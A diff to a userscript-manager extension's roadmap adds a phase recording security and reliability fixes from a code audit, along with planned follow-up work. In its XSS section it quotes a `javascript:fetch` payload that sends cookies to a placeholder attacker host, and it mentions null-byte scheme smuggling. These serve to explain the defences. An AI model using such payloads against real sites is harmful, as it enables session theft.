@@ -3,8 +3,8 @@
 > From v2.0.1 (bash-concatenated JS prototype) to production-grade TypeScript extension.
 > Each phase is independently shippable. Later phases depend on earlier ones.
 >
-> **Roadmap version:** Round 12 — last research sweep 2026-05-17. Shipped baseline: v3.10.1 (April 28, 2026). Pending: v3.11.0 (storage-hardening grouping, Phase 38.13) ➜ v3.12.0+ (Phase 39, Round 12 catch-up).
-> **Source floor:** >260 distinct URLs across Rounds 1–12 (see appendices). Every Now/Next item is traceable to at least one source.
+> **Roadmap version:** Round 13 — last research sweep 2026-05-18. Shipped baseline: v3.10.1 (April 28, 2026) + three-commit audit-hardening pass (`d1e3ee2`, `e306b2b`, `325db86` on 2026-05-18) folded in. Pending: v3.11.0 (storage-hardening grouping, Phase 38.13) ➜ v3.12.0+ (Phase 39, Round 12 catch-up) ➜ Phase 40 (Round 13 audit productionization).
+> **Source floor:** >294 distinct URLs across Rounds 1–13 (272 carried from Round 12 + 22 net-new for Round 13, indexed 273–294). Every Now/Next item is traceable to at least one source.
 
 ---
 
@@ -4145,4 +4145,363 @@ _Net-new sources since Round 11 (May 5 2026 cutoff). Numbered 231–272 to exten
 Net-new sources: **42** (231–272 plus 9 dependency-release URLs). Cumulative source floor (>260 across Rounds 1–12) remains well above the 30–60 floor. No Round 12 item duplicates a Now/Next item from Rounds 1–11; explicit promotions (17.3, 22.2, 32.1 deprio, 11.11 dead-mark) are cross-references, not duplicates. Greasemonkey-is-dead assumption from Rounds 1–11 is **invalidated** — May 12–15 2026 commits prove arantius is actively maintaining; future rounds must monitor GM master commits as a real signal source.
 
 Phase 39 added (49 sub-items). Phase summary milestone table updated with v3.12.0+. Targeted edits applied to Phases 11.11, 17.3, 22.2, and 32.1 with status notes referencing Round 12 sources.
+
+---
+
+## Phase 40 — Round 13 Audit-Hardening Productionization (May 18 2026)
+
+**Goal:** Lock in the in-session audit pass executed on 2026-05-18 (three commits: `d1e3ee2`, `e306b2b`, `325db86`) and surface the residue — bugs verified to exist but deferred because the fix needs a broader refactor than a one-session pass allows. Round 13 is intentionally narrow: one day of fresh external research yielded almost nothing net-new (Round 12 sweep was 2026-05-17, only ~24h prior), so the entire phase is internal-quality work uncovered by adversarial code review.
+
+### Phase 40 progress snapshot (2026-05-18)
+
+| Status | Items |
+|---|---|
+| ✅ Shipped (already in main) | **40.1** Storage cache-init race · **40.2** GM_cookie scheme validation · **40.3** webNav dedup tab-redirect gap · **40.4** `installFromUrl` scheme defense · **40.5** Wrapper-side Map LRU caps · **40.6** Storage quota-warn reset hysteresis · **40.7** Case-folded file-extension checks · **40.8** `publish.sh --draft` artifact preservation · **40.9** Script-store XSS defang on third-party catalog hrefs |
+| ⏳ Pending (Round 13 plan documented; implementation TBD) | **40.10** DNR rule orphan across SW restart · **40.11** `window.onurlchange` monkey-patch stack-up · **40.12** Cloud sync `Promise.race` doesn't cancel `_performSync` · **40.13** `src/types/messages.ts` ResponseMap completeness · **40.14** Telemetry-free leak probe for wrapper Maps |
+
+### 40.1 Storage Cache-Init Race ✅ Shipped (commit `d1e3ee2`)
+
+`modules/storage.js` had four cache-managers — `SettingsManager`, `ScriptStorage`, `FolderStorage`, and per-script `ScriptValues` — whose `init()` methods used the pattern `if (cache !== null) return; const data = await chrome.storage.local.get(...); cache = data || default;`. Two concurrent cold-start callers both passed the `cache === null` guard before either finished loading; the second resolved later and clobbered mutations the first had already applied to the cache. The TypeScript mirror at `src/modules/storage.ts` already had the correct `_initPromise` gating pattern; the runtime JS was lagging behind.
+
+Fix: each init() now serializes through a per-manager (or per-script for `ScriptValues`) `_initPromise`. `try/await/finally` clears the promise on resolution so test resets that null the cache between cases pick up a fresh load (caught by the existing 48-case `tests/storage.test.js` suite plus a new parallel-init regression — five concurrent `init()` calls must hit `chrome.storage.local.get` exactly once).
+
+Source: this audit pass + the existing TS mirror pattern in [`src/modules/storage.ts`](src/modules/storage.ts) and [`bg/workspaces.js`](bg/workspaces.js). New test: [`tests/storage.test.js`](tests/storage.test.js) `init() serializes concurrent cold-start callers`.
+
+### 40.2 GM_cookie URL Scheme Validation ✅ Shipped (commit `d1e3ee2`)
+
+`background.core.js` `GM_cookie_list` / `GM_cookie_set` / `GM_cookie_delete` passed `data.url` straight into `chrome.cookies.*` without scheme validation. A userscript granted `@grant GM_cookie` could pass `chrome-extension://`, `javascript:`, `data:`, `blob:`, or `file://` URLs; Chrome rejected them with opaque internal errors that surfaced to the script as confusing strings ("Invalid URL pattern", etc.).
+
+Fix: new `isHttpCookieUrl()` helper enforces `http:` / `https:` only and returns a clear `'url must be http(s)://'` error. Verified by [`tests/background-cookie-url.test.js`](tests/background-cookie-url.test.js) — five cases covering scheme allowlist, control-char smuggling (`\u0000javascript:`), and source-level wiring pins so a future refactor can't silently drop the guard.
+
+Source: this audit pass. Helper definition at [`background.core.js`](background.core.js) `isHttpCookieUrl`.
+
+### 40.3 webNavigation Dedup Tab-Redirect Gap ✅ Shipped (commit `d1e3ee2`)
+
+`_pendingFetches` was a `Set<url>` used to dedup concurrent `*.user.js` fetches. The intent was correct (don't fetch the same URL twice) but the implementation lost the second tab: when tab A and tab B navigated to the same userscript URL simultaneously, tab A's listener added the URL to the Set and fetched; tab B's listener saw the URL was already in-flight and `return`-ed early — without ever redirecting tab B to `install.html`. Tab B was left on the raw script source.
+
+Fix: switched `_pendingFetches` to `Map<url, Promise<{action}>>`. Both tabs await the same fetch and each gets navigated to `pages/install.html` (or pass through normally if the body is not a userscript). Extracted `_fetchPendingUserscript()` so the shared work has a clean test boundary.
+
+Source: this audit pass.
+
+### 40.4 `installFromUrl` Scheme Defense-in-Depth ✅ Shipped (commit `d1e3ee2`)
+
+`background.core.js` `installFromUrl(url)` accepted any string and passed it to `fetch()`. The dashboard / popup are the only legitimate callers, but a malformed `installFromUrl` message (forged from a buggy callsite, replay-attacked from an old service-worker state, or someday from a future `messages.ts` consumer) could trigger fetches against `file://`, `data:`, `blob:`, `javascript:`, or `chrome-extension://` URLs. `fetch()` in MV3 service workers honors most of those.
+
+Fix: `installFromUrl` now rejects non-http(s) URLs up-front with a clear `'URL must be http(s)://'` error before `fetch()` is invoked.
+
+Source: this audit pass.
+
+### 40.5 Wrapper-Side Map LRU Caps ✅ Shipped (commit `e306b2b`)
+
+`buildWrappedScript()` in `background.core.js` injects three `Map`s into the USER_SCRIPT world per userscript per host tab: `_notifCallbacks` (GM_notification onclick / onbuttonclick / ondone), `_openedTabs` (GM_openInTab close tracking), and `_downloadCallbacks` (GM_download onload / onerror / onprogress / ontimeout). Each map deletes its entry on the corresponding event. If the event never arrives — background SW restarted between request and event, content-script bridge missed the signal, tab killed before the bridge attached — the entry stays in the map for the lifetime of the host tab.
+
+A misbehaving script that fires `GM_notification` in a loop without listening for `ondone`, or `GM_download` in a loop without `onload`, leaks unbounded entries in the USER_SCRIPT-world memory. The background side already had a 500-entry cap at `self._notifCallbacks`; the wrapper side did not.
+
+Fix: each map now LRU-evicts the oldest entry once it reaches its cap — 500 for `_notifCallbacks` (mirrors background), 200 for `_openedTabs`, 200 for `_downloadCallbacks`. Cleanup paths on actual events are unchanged. The numbers are deliberately generous because the goal is to bound pathological scripts, not to limit reasonable use.
+
+Source: this audit pass. Cap constants `_NOTIF_CALLBACKS_CAP`, `_OPENED_TABS_CAP`, `_DOWNLOAD_CALLBACKS_CAP` in [`background.core.js`](background.core.js) `buildWrappedScript`.
+
+### 40.6 Storage Quota-Warn Reset Hysteresis ✅ Shipped (commit `e306b2b`)
+
+`pages/dashboard.js` `updateStats()` showed a one-time warning toast when `chrome.storage.local` usage crossed 85% — `state._quotaWarned = true` and never cleared. A user who cleaned up below threshold and then refilled storage stayed warning-silent for the whole dashboard session.
+
+Fix: the flag now resets to `false` once usage drops below 70% (hysteresis band 70–85 prevents flapping at threshold crossings). Next overflow re-fires the warning.
+
+Source: this audit pass.
+
+### 40.7 Case-Folded File-Extension Checks ✅ Shipped (commit `e306b2b`)
+
+`pages/dashboard.js` had three import / drag-drop call sites comparing `file.name.endsWith('.user.js')` / `.zip` without case-folding. Files named `MyScript.USER.JS` or `BACKUP.ZIP` were silently rejected as "not recognized." A fourth site (`installFromFile`) was already correct (uses `/i` regex).
+
+Fix: lower-case `file.name` once at the top of each branch and run all suffix tests against the lower-cased name. Audited the whole file for similar patterns and confirmed no other case-sensitive suffix tests remain on user-supplied filenames.
+
+Source: this audit pass.
+
+### 40.8 `publish.sh --draft` Artifact Preservation ✅ Shipped (commit `e306b2b`)
+
+`bash publish.sh --draft` ran `rm -f "$ZIP_NAME"` immediately after the upload phase, deleting the very artifact a reviewer might still want to inspect, hand-upload to a different store, or re-attach to a CWS review reply. The cleanup `rm` belongs only on the publish-and-publish path.
+
+Fix: draft path now `exit 0`s after the upload step with the ZIP path printed in the success banner. The cleanup `rm` is reachable only after the publish API returns success.
+
+Source: this audit pass.
+
+### 40.9 Script-Store XSS Defang on Third-Party Catalog `href` ✅ Shipped (commit `325db86`)
+
+`pages/dashboard-store.js` `renderCards()` and `pages/dashboard.js` "find script" card both interpolated `pageUrl` / `codeUrl` / `s.url` from third-party catalog API responses (Greasy Fork, OpenUserJS, GitHub) into `<a href>` with `escapeHtml` only. `escapeHtml` prevents tag injection but does *not* neutralize `javascript:`, `data:`, `vbscript:`, `blob:`, or `file:` URLs — those render as a clickable XSS link in the dashboard.
+
+The third-party feeds are generally trusted, but a poisoned listing, a compromised API response, or a malicious script author submitting a hostile homepage URL could put `javascript:alert(document.cookie)` (or worse — `javascript:fetch('https://attacker/'+document.cookie)`) one click away inside our extension UI. The extension origin (`chrome-extension://<id>/`) has access to `chrome.runtime`, `chrome.storage.local`, and the user's entire scripts collection; running attacker JS there is full account takeover.
+
+Fix: new `safeExternalUrl()` helper in dashboard-store.js enforces a scheme allowlist (`http` / `https` / `ftp` / relative) and strips C0 control characters so a smuggled `\u0000javascript:` payload can't bypass the prefix check. `pages/dashboard.js` find-script-card routes `s.url` through the existing shared `sanitizeUrl()` and renders an inert `<span>` fallback when the scheme is rejected. Verified by [`tests/dashboard-store-url-safety.test.js`](tests/dashboard-store-url-safety.test.js) — eight cases including the source-level wiring pin.
+
+Source: this audit pass. Helper at [`pages/dashboard-store.js`](pages/dashboard-store.js) `safeExternalUrl`.
+
+### 40.10 DNR Rule Orphan Across SW Restart (deferred refactor)
+
+`background.core.js` tracks `@webRequest` / `GM_webRequest` declarative-net-request rule IDs in an in-memory `_webRequestRuleMap`. When a script is deleted, `removeWebRequestRules(scriptId)` looks up the IDs in the map and calls `chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds})`. If the service worker dies between rule creation and rule deletion, the map is gone but the rules persist in Chrome's DNR engine — orphans that keep filtering / redirecting traffic for a script the user has uninstalled.
+
+Fix sketch: persist `_webRequestRuleMap` to `chrome.storage.session` on every mutation (Phase 13.11 storage.session work already proves the pattern). On SW wake, hydrate the map before any rule operations. Add a reconciliation pass that compares hydrated IDs against the live `getDynamicRules()` response and removes any rule whose `scriptId` no longer exists in storage.
+
+Effort: 2/5 (mostly mechanical, plus one reconciliation function). Risk: 2/5 — the reconciliation pass must not race a concurrent install. Dependencies: none net-new; touches Phase 3 patterns already in production.
+
+Source: this audit pass (deferred from the in-session fix because of cross-handler scope).
+
+### 40.11 `window.onurlchange` Monkey-Patch Stack-Up Across Script Re-Injection (deferred refactor)
+
+The wrapper template for any script with `@grant window.onurlchange` monkey-patches `history.pushState`, `history.replaceState`, `window.addEventListener`, and `window.removeEventListener` on each injection, plus registers `popstate` and `hashchange` listeners. When a script is re-registered while the host tab is open (update applied, settings changed, manual reload), a NEW wrapper is injected and a new layer of patching is added on top of the previous layer. Old `_urlChangeHandlers` arrays stay reachable via the old wrap's closure; old patches stay in the chain.
+
+The user-visible symptom is benign (URL changes still fire) but the leak compounds over a long browsing session. The fix is non-trivial: we need a page-scoped `Object.defineProperty(window, '__svUrlChangeBound__', ...)` guard plus a shared `__svurlchange__` `CustomEvent` dispatcher so multiple scripts share one underlying monkey-patch and each script only registers its own handler on the dispatcher.
+
+Effort: 3/5 (touches USER_SCRIPT-world template — needs careful testing of cross-script-world interactions in the per-script-world variant on Chrome 133+). Risk: 3/5 — wrong implementation breaks existing scripts that rely on the current per-script handler array semantics. Dependencies: ideally lands after [`src/background/wrapper-builder.ts`](src/background/wrapper-builder.ts) is the canonical wrapper source (Phase 1 wave 4).
+
+Source: this audit pass. Cross-reference: existing `@grant window.onurlchange` block in [`background.core.js`](background.core.js) around line 7368.
+
+### 40.12 Cloud Sync `Promise.race` Doesn't Cancel In-Flight `_performSync` (deferred refactor)
+
+`CloudSync.sync()` in `background.core.js` uses `Promise.race([this._performSync(), timeoutPromise])` with a 90-second timeout. When the timeout wins, `await Promise.race(...)` throws, the `catch` returns `{ error: 'Sync timed out after 90s' }`, and the `finally` clears `_syncInProgress = false`. But `_performSync()` is still running — `Promise.race` doesn't cancel the loser. The orphaned sync continues until it eventually settles, possibly writing to `chrome.storage.local` long after a new sync has started, possibly corrupting the new sync's view of state.
+
+Real-world impact is bounded by the MV3 SW lifetime (~5 min idle), but the window between 90s (timeout) and 300s (SW kill) is enough for state corruption.
+
+Fix sketch: hoist an `AbortController` to the sync scope, thread `signal` into every `fetch()` in `_performSync()` / the provider modules, and call `controller.abort()` when the timeout fires. The provider modules already pass `signal` through their internal fetches; the missing piece is the top-level controller plumbing.
+
+Effort: 3/5 (signal threading through 4 providers — Google Drive, Dropbox, OneDrive, WebDAV — plus the Easy Cloud module). Risk: 2/5 — `AbortError` is well-handled by `fetch` and `crypto.subtle`, but check the provider code for any `JSON.parse(await resp.text())` paths that don't propagate the abort. Dependencies: none.
+
+Source: this audit pass.
+
+### 40.13 `src/types/messages.ts` ResponseMap Completeness (existing gap, formalize as a Phase 40 task)
+
+Round 12 left a standing note that `ResponseMap` in [`src/types/messages.ts`](src/types/messages.ts) covers only ~25 of 135+ background message actions; the rest fall back to `unknown`, defeating the typed-messaging guarantee Phase 1 set out to deliver. The audit didn't fix this (it's a long-tail typing task, not a bug per se) but Round 13 formalizes the work item rather than leaving it implicit.
+
+Fix sketch: enumerate every `case '...'` in `background.core.js` switch dispatch, write a `ResponseFor<T>` entry per action, regenerate the discriminated-union type, and bump the test surface so any new action without a `ResponseFor<>` mapping fails typecheck.
+
+Effort: 3/5 (mostly typing, but every entry needs to inspect what the handler actually returns). Risk: 1/5 (typecheck-only change). Dependencies: none.
+
+Source: this audit pass + the standing Round 12 gap note.
+
+### 40.14 Telemetry-Free Leak Probe for Wrapper Maps (Next)
+
+40.5 capped the wrapper-side Maps but we have no way to know whether real-world scripts ever hit the cap. ScriptVault's zero-telemetry positioning rules out shipping a "Maps cap hit, count: N" beacon, but a debug-only DevTools panel surface is fine.
+
+Add a counter inside each wrapper Map's eviction branch (`_evictionCount`) and surface it in the DevTools `Network` / `Execution` tab next to the per-script perf badge. A non-zero count for any script is a smell; the user (or the script author when debugging) gets a one-line "this script is leaking GM_notification callbacks — check that you handle ondone" hint.
+
+Effort: 2/5 (counter + UI row). Risk: 1/5 (debug surface only). Dependencies: Phase 20 observability surface — the counter row goes there.
+
+Source: this audit pass.
+
+### External Research Catch-Up (week of 2026-05-12 → 2026-05-18)
+
+Round 12's cutoff was 2026-05-17 so this delta is ~24h of net-new platform / dependency / community signal. Smaller than typical, but real items surfaced.
+
+**Tier tags below:** **Now** = blocks the next release (v3.11.x / v3.12.x). **Next** = scheduled within the next two releases. **Later** = tracked but not committed. **Track** = follow upstream; no immediate work.
+
+#### 40.15 ScriptCat S3-Compatible Cloud Sync Backend — Next (extends Phase 21)
+
+ScriptCat shipped an S3-compatible sync provider on 2026-05-17 (commit [a00bc65](https://github.com/scriptscat/scriptcat/commit/a00bc65)). Targets any S3-compatible backend — AWS, Cloudflare R2, Backblaze B2, MinIO, Wasabi. Tampermonkey has WebDAV / TamperDAV; ScriptVault has WebDAV + 3 OAuth providers but no self-host-friendly object-store target.
+
+R2 and Backblaze are zero-egress at the relevant traffic levels, which makes them the cheapest "I own my data" options for a power user. Phase 21 already lists "S3" as a Later item; promote to Next on the strength of a second major manager validating the design.
+
+Effort: 3/5. Risk: 2/5 (S3 auth is well-understood; bucket-policy mistakes are the main user-side risk). Dependencies: Phase 8 sync rewrite framing; the new provider slots in alongside the existing WebDAV adapter.
+
+#### 40.16 ScriptCat `@run-at context-menu` Parser Tolerance — Next (cross-ref Phase 11)
+
+ScriptCat re-added `@run-at context-menu` on 2026-05-15 (commit [e012e9e](https://github.com/scriptscat/scriptcat/commit/e012e9e)). It's a directive that gates script execution to right-click invocation, deliberately separate from `GM_registerMenuCommand`. ScriptVault's parser currently maps unknown `@run-at` values to `document-idle` — verify, then decide:
+
+- **Minimum:** parser must not throw on the unknown token. Drop silently with a debug log.
+- **Next step:** add a lint warning that the directive is ScriptCat-specific and won't fire in ScriptVault.
+- **Stretch:** implement support by wiring into the existing context-menu infrastructure (Phase 39.7) — scripts with `@run-at context-menu` register a menu entry and only execute on click.
+
+Effort: 1/5 (parser tolerance) → 3/5 (full support). Risk: 1/5. Dependencies: Phase 39.7 (`chrome.contextMenus` already plumbed for `GM_registerMenuCommand`).
+
+#### 40.17 Popup "C" Indicator for Content-Script-World Scripts — Now
+
+ScriptCat shipped a "C" badge in its popup on 2026-05-15 (commit [5fef662](https://github.com/scriptscat/scriptcat/commit/5fef662)) to indicate scripts running in content-script world rather than user-script world. ScriptVault's popup is a wall of toggles — a per-row world-context badge is cheap UX. Pairs naturally with Phase 11.4's MAIN-world fallback work and Phase 12 popup polish.
+
+Effort: 1/5. Risk: 1/5. Dependencies: none.
+
+#### 40.18 `chrome-webstore-upload-cli` v6.0.0 Migration Path — Now (supersedes Phase 39.35)
+
+`chrome-webstore-upload-cli` reached **v6.0.0** on 2026-05-12 — completed migration to CWS API v2 and added a required `publisherId` config from the CWS Developer Dashboard ([release notes](https://github.com/fregante/chrome-webstore-upload/releases/tag/v6.0.0)). Round 12 / Phase 39.35 planned for v4.0.0; the actual cutover happens at v6.
+
+- Update `publish.sh` and `cws-setup.sh` to source `PUBLISHER_ID` from `.env` alongside the existing `EXTENSION_ID` / `CLIENT_ID` / `CLIENT_SECRET` / `REFRESH_TOKEN`.
+- Update [`docs/release-runbook.md`](docs/release-runbook.md) §3 (CWS API v2 migration) with the v6 invocation pattern.
+- Pin `chrome-webstore-upload-cli@^6` in `package.json` `devDependencies` once `npm test` confirms the breaking changes don't bleed into our tooling.
+
+Effort: 2/5. Risk: 2/5 (config-only break; reversible). Dependencies: Phase 39.1 OIDC plumbing for short-lived tokens (the v2 API requires shorter lifetimes).
+
+#### 40.19 fflate v0.8.3 Zip64 Buffer Over-Read Fix — Now
+
+fflate shipped **v0.8.3** on 2026-05-16 — first release in 2+ years ([changelog](https://github.com/101arrowz/fflate/releases/tag/v0.8.3)). Fixes:
+
+- **Zip64 buffer over-read** — matters for large script-library exports (ScriptVault uses fflate for the ZIP export / import flow; a library of 500+ scripts can push past the Zip64 threshold).
+- Cross-realm `Uint8Array` for `zip` / `zipSync` (sandbox-iframe compatibility).
+- Lower post-compression memory.
+- TS 5.7+ typing fix.
+
+Low-risk pickup: bump `lib/fflate.js` to v0.8.3, regression-test with the existing `tests/runtime-import-export.test.js` and `tests/source-backup-modules.test.js` suites.
+
+Effort: 1/5. Risk: 1/5. Dependencies: none.
+
+#### 40.20 Monaco Dependency Audit Sweep — Next (mirrors upstream)
+
+Microsoft's `monaco-editor` repo shipped six dependency-bump commits 2026-05-12 → 2026-05-15 ([main commits](https://github.com/microsoft/monaco-editor/commits/main)) on `postcss`, `fast-uri`, `@babel/plugin-transform-modules-systemjs`, plus an `npm audit fix` (#5326). No new Monaco release yet, but the lockfile drift in upstream points at transitive CVEs ScriptVault should mirror in its own `package-lock.json`.
+
+Run `npm audit --omit=optional` against the current lockfile, file any findings as Phase 17 (Security Round 2) sub-items, and add a `npm audit` step to the existing `.github/workflows/ci.yml` so future drift is caught at PR time.
+
+Effort: 1/5 (CI step) + variable (depends on findings). Risk: 1/5. Dependencies: none.
+
+#### 40.21 WECG `async_initialization` Manifest Opt-In — Track (for v4 manifest)
+
+W3C WebExtensions Community Group issue [#989](https://github.com/w3c/webextensions/issues/989) is hot 2026-05-13 → 2026-05-16. Proposes `"async_initialization": true` in the manifest plus `runtime.markInitializationComplete()` to resolve the long-standing footgun where `chrome.storage`-dependent listener registration races service-worker startup.
+
+ScriptVault has exactly this problem — `ensureInitialized()` is our workaround. Not shipping yet, but track because:
+
+- If it ships as part of the next manifest version, our `ensureInitialized()` becomes unnecessary plumbing.
+- We can contribute to the spec discussion now — our `_initPromise = init()` pattern is one viable shape for the API.
+
+Effort: 0/5 (track only). Risk: 0/5. Dependencies: spec lands first.
+
+#### 40.22 WECG `i18n.getAvailableLanguages()` — Track (drop hard-coded locale list)
+
+WECG [#995](https://github.com/w3c/webextensions/issues/995) (opened 2026-05-05) proposes `chrome.i18n.getAvailableLanguages()` to enumerate the extension's bundled locales at runtime. ScriptVault's popup currently hard-codes the 8-locale list — the proposed API drops the hard-coding.
+
+If the API lands, replace the popup language picker's locale array with a runtime call. Non-blocking; nice-to-have.
+
+Effort: 1/5 (once the API ships). Risk: 0/5. Dependencies: spec + browser support.
+
+#### 40.23 Chrome 148 Stable Security Wave — Next (audit ScriptVault for CVE-2026-8587 fallout)
+
+Chrome 148.0.7778.x security release 2026-05-12 ([Chrome Releases blog](https://chromereleases.googleblog.com/2026/05/)) patches CVE-2026-8587 — use-after-free in Extensions on Mac. Not a ScriptVault code bug, but:
+
+- Bump `minimum_chrome_version` in `manifest.json` from 120 to a value that guarantees the fix is present, after confirming we have no users on older Chrome.
+- Document the rationale in the manifest comment alongside the existing minimum-version note.
+
+Effort: 1/5. Risk: 2/5 (raising min version cuts off the long-tail of legacy users; check telemetry-free heuristics before pulling the trigger).
+
+#### 40.24 Greasemonkey "Drop `sourceURL` Injection" Lesson — Next (audit our own)
+
+Greasemonkey removed broken `sourceURL` injection on 2026-05-13 ([commit 19100d7](https://github.com/greasemonkey/greasemonkey/commit/19100d7)) — they gave up on tying DevTools console source lines back to userscript files. ScriptVault has the same problem space and Phase 39.19 already noted the gap. Round 13 confirms Greasemonkey's conclusion: don't sink a sprint into trying to fix this.
+
+If ScriptVault has any `//# sourceURL=` injection in `buildWrappedScript()`, audit whether it's actually doing anything; if not, drop it (one less surface for sandboxing inconsistencies).
+
+Effort: 1/5 (audit). Risk: 1/5. Dependencies: none.
+
+#### 40.25 Adjacent-Tool Pattern Borrows — Later / Track (Stylus, uBO Lite, Bitwarden, Vimium)
+
+A small adjacent-tool pattern harvest from the external research pass; each is a Later item unless promoted, but all are real patterns worth noting before they're forgotten:
+
+- **Stylus** ([openstyles/stylus](https://github.com/openstyles/stylus)) — content-script style injection with ~10 KB payload + sync-XHR FOUC option. Pattern: minimal-payload `@run-at document-start` to avoid flash-of-unstyled-content. Applies to ScriptVault scripts that run at `document-start`.
+- **uBO Lite** ([uBlockOrigin/uBOL-home](https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-%28FAQ%29)) — reference implementation of `userScripts.execute()` for MAIN-world routing. Pairs with Phase 11.4.
+- **Bitwarden** ([bitwarden/clients/apps/browser](https://github.com/bitwarden/clients/tree/main/apps/browser)) — unified `apps/browser` codebase with per-target build matrix that produces Chrome / Edge / Firefox / Safari artifacts from one source. Pairs with Phase 33 cross-browser pipeline.
+- **Vimium** ([philc/vimium](https://github.com/philc/vimium/blob/master/content_scripts/link_hints.js)) — link-hint overlay pattern for a hypothetical "Run script on element" UI.
+
+Effort: variable. Risk: low (these are reference designs to study, not direct dependencies). Dependencies: each applies to a different phase.
+
+### Phase 40 — Items Verified Already-Fixed (audit-only)
+
+The audit pass started from CLAUDE.md's "Known Remaining Issues" list and discovered four of the entries were stale — already fixed in earlier rounds but the doc lagged. Documenting them here as audit receipts so future rounds don't re-flag:
+
+| Claim in CLAUDE.md | Actual state | Resolution |
+|---|---|---|
+| SSRF list in `public-api.js` incomplete (missing AWS metadata `169.254.169.254`, `0.0.0.0`, IPv6 link-local/ULA) | Already comprehensive — `_isInternalHost()` / `_isInternalIPv4()` cover loopback/RFC1918/CGNAT/link-local/ULA/broadcast plus IPv4-mapped IPv6 | CLAUDE.md cleaned in Round 13 |
+| `dashboard-linter._computeDiff` has no size guard | Already added at `pages/dashboard-linter.js:938` — `n * m > 5000000` falls back to hash-based diff | CLAUDE.md cleaned in Round 13 |
+| `monaco-adapter.js _valueCallbacks` is dead code | Already removed | CLAUDE.md cleaned in Round 13 |
+| `registerAllScripts(false)` short-circuit drift | Already fixed in Round 11 (diff-based registration at `background.core.js:5153`) | CLAUDE.md cleaned in Round 13 |
+
+### Phase 40 — Bug Claims Investigated and Rejected
+
+The audit's parallel agents surfaced ~25 candidate findings; ~10 were verified and shipped (40.1–40.9), ~5 were verified and deferred (40.10–40.14), and the remainder were over-claims that needed rejection. Documenting the rejections so the next round doesn't re-derive them:
+
+| Claim | Verdict |
+|---|---|
+| `monaco-adapter.js` postMessage uses `'*'` targetOrigin → XSS surface | **Rejected.** The sandboxed iframe has `null` origin per `manifest.json` sandbox declaration. Any non-`'*'` targetOrigin silently drops the message. Inbound listener already validates `event.source === frame.contentWindow`. Existing comment in source explains the design. |
+| `ScriptStorage.set()` doesn't roll back new scripts on persist failure | **Rejected.** Already correct at `modules/storage.js:143-144` — `if (prev !== undefined) this.cache[id] = prev; else delete this.cache[id];`. |
+| `install.js:784 badge.innerHTML = presentation.badgeHtml` is XSS | **Rejected.** `badgeHtml` is one of four hard-coded string literals defined in `getInstallPresentation()`; no user data is interpolated. |
+| `backup-scheduler.js` adds the `chrome.alarms.onAlarm` listener inside `init()` without dedup | **Rejected.** `_initialized` guard at the top of `init()` prevents the second call from ever reaching the `addListener()` line. |
+| Unicode `\u2028` / `\u2029` line-terminator bypass in `@require` URL embedding | **Rejected.** Verified with a Node REPL test: JavaScript regex `.` does NOT match `\u2028` (forced via `/^([^\r\n]*)$/` comparison). Parser captures stop at `\u2028`, so `meta.require[]` never contains a smuggled trailer. |
+| `atob()` of unpadded base64url needs explicit padding restoration for Firefox compat | **Rejected.** Firefox 128+ (the `strict_min_version` declared in `manifest-firefox.json`) handles unpadded base64 via the WHATWG forgiving-base64-decode algorithm; only length `% 4 == 1` fails, which Ed25519 signatures (64 bytes = 86 unpadded chars, `% 4 == 2`) never hit. |
+| `dashboard-store.js` ReDoS in wildcard `@match` pattern regex | **Rejected.** `.replace(/\*/g, '.*')` produces `.*.*.*` patterns whose greedy-quantifier composition does not catastrophically backtrack on the URL strings they're tested against; verified by exemplar pathological inputs in mental trace + the existing test corpus. |
+| `escapeHtml` on `data-id="${scriptIdAttr}"` is unsafe because escapeHtml doesn't quote-escape | **Rejected.** [`shared/utils.js`](shared/utils.js) `escapeHtml` does escape both `"` and `'` (lines 17–18). |
+
+### Phase 40 Source Index (net-new for Round 13)
+
+| # | URL | Backs |
+|---|-----|-------|
+| 273 | https://github.com/SysAdminDoc/ScriptVault/commit/d1e3ee2 | 40.1–40.4 |
+| 274 | https://github.com/SysAdminDoc/ScriptVault/commit/e306b2b | 40.5–40.8 |
+| 275 | https://github.com/SysAdminDoc/ScriptVault/commit/325db86 | 40.9 |
+| 276 | https://infra.spec.whatwg.org/#forgiving-base64-decode | Rejection: atob padding |
+| 277 | https://developer.mozilla.org/en-US/docs/Web/API/atob | Rejection: atob padding |
+| 278 | https://developer.chrome.com/docs/extensions/reference/api/cookies | 40.2 scheme allowlist |
+| 279 | https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest#property-MAX_NUMBER_OF_DYNAMIC_AND_SESSION_RULES | 40.10 reconciliation rationale |
+| 280 | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AbortController | 40.12 sync abort plumbing |
+| 281 | https://github.com/scriptscat/scriptcat/commit/a00bc65 | 40.15 ScriptCat S3-compatible sync |
+| 282 | https://github.com/scriptscat/scriptcat/commit/e012e9e | 40.16 ScriptCat `@run-at context-menu` |
+| 283 | https://github.com/scriptscat/scriptcat/commit/5fef662 | 40.17 popup C-indicator badge |
+| 284 | https://github.com/fregante/chrome-webstore-upload/releases/tag/v6.0.0 | 40.18 CWS upload v6 cutover |
+| 285 | https://github.com/101arrowz/fflate/releases/tag/v0.8.3 | 40.19 fflate Zip64 fix |
+| 286 | https://github.com/microsoft/monaco-editor/commits/main | 40.20 monaco dependency wave |
+| 287 | https://github.com/w3c/webextensions/issues/989 | 40.21 `async_initialization` opt-in |
+| 288 | https://github.com/w3c/webextensions/issues/995 | 40.22 `i18n.getAvailableLanguages()` |
+| 289 | https://chromereleases.googleblog.com/2026/05/ | 40.23 Chrome 148 CVE-2026-8587 |
+| 290 | https://github.com/greasemonkey/greasemonkey/commit/19100d7 | 40.24 GM `sourceURL` removal lesson |
+| 291 | https://github.com/openstyles/stylus | 40.25 Stylus FOUC pattern |
+| 292 | https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-%28FAQ%29 | 40.25 uBO Lite MAIN-world routing |
+| 293 | https://github.com/bitwarden/clients/tree/main/apps/browser | 40.25 Bitwarden cross-browser pipeline |
+| 294 | https://github.com/philc/vimium/blob/master/content_scripts/link_hints.js | 40.25 Vimium hint overlay pattern |
+
+### Round 13 — Promoted Tier Changes (delta from Round 12)
+
+- **Phase 21** (Extended Sync Backends, S3 sub-task): **Later → Next.** ScriptCat's 2026-05-17 S3-compatible provider plus TM's existing WebDAV / TamperDAV validates the "self-host-friendly object-store target" design — second major manager is signal enough to promote.
